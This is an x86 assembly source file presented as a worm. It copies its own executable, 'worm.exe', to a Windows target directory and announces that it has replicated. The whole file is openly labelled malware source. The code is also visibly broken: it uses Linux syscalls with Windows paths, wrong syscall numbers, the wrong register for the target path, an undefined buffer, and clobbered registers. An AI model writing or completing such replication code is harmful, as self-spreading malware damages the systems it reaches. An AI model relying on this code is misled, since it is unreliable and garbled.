section .data
    source_file db 'worm.exe', 0         ; Name of the worm executable
    target_file db 'C:\TargetDirectory\worm_copy.exe', 0  ; Destination path for replication
    msg db 'Worm has replicated!', 0
    error_msg db 'Error occurred during replication.', 0

section .text
    global _start

_start:
    ; Attempt to open the source file
    mov eax, 5                       ; syscall: open
    lea ebx, [source_file]           ; pointer to source file
    xor ecx, ecx                     ; O_RDONLY
    int 0x80                         ; call kernel
    test eax, eax                    ; Check for error
    js .error                        ; Jump if error
    mov ebx, eax                     ; Save source file descriptor

    ; Attempt to create the target file
    mov eax, 5                       ; syscall: open
    lea ecx, [target_file]           ; pointer to target file
    mov edx, 66                      ; O_WRONLY | O_CREAT | O_TRUNC
    int 0x80                         ; call kernel
    test eax, eax                    ; Check for error
    js .error                        ; Jump if error
    mov esi, eax                     ; Save target file descriptor

    ; Read from source file and write to target file
.copy_loop:
    xor eax, eax                     ; syscall: read
    mov ebx, ebx                     ; source file descriptor
    lea ecx, [buffer]                ; buffer for data
    mov edx, 1024                    ; max length
    int 0x80                         ; call kernel
    test eax, eax                    ; Check if end of file
    jz .done                         ; Jump if done

    ; Write to target file
    mov eax, 4                       ; syscall: write
    mov ebx, esi                     ; target file descriptor
    mov edx, eax                     ; number of bytes read
    int 0x80                         ; call kernel
    jmp .copy_loop                   ; Repeat

.done:
    ; Close both files
    mov eax, 6                       ; syscall: close
    mov ebx, esi                     ; target file descriptor
    int 0x80                         ; call kernel
    mov ebx, ebx                     ; source file descriptor
    int 0x80                         ; call kernel

    ; Write success message
    mov eax, 4                       ; syscall: write
    mov ebx, 1                       ; STDOUT
    lea ecx, [msg]                   ; success message
    mov edx, 24                      ; message length
    int 0x80                         ; call kernel

    ; Exit gracefully
    xor eax, eax                     ; syscall: exit
    int 0x80

.error:
    ; Error handling
    mov eax, 4                       ; syscall: write
    mov ebx, 2                       ; STDERR
    lea ecx, [error_msg]             ; error message
    mov edx, 32                      ; message length
    int 0x80                         ; call kernel
    xor eax, eax                     ; syscall: exit
    int 0x80
